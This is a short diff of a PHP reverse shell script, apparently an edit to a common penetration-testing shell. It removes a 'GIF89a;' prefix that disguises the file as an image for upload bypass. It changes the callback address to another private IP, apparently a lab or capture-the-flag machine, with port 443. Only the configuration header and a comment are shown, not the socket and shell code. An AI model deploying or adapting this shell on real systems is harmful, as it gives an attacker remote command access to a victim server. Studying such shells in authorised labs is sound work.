@@ -1,9 +1,8 @@
-GIF89a;
 <?php
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '192.168.45.199';  // CHANGE THIS
+$ip = '10.10.14.106';  // CHANGE THIS
 $port = 443;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
@@ -14,7 +13,7 @@ $debug = 0;
 
 //
 // Daemonise ourself if possible to avoid zombies later
-//
+// 
 
 // pcntl_fork is hardly ever available, but will allow us to daemonise
 // our php process and avoid zombies.  Worth a try...
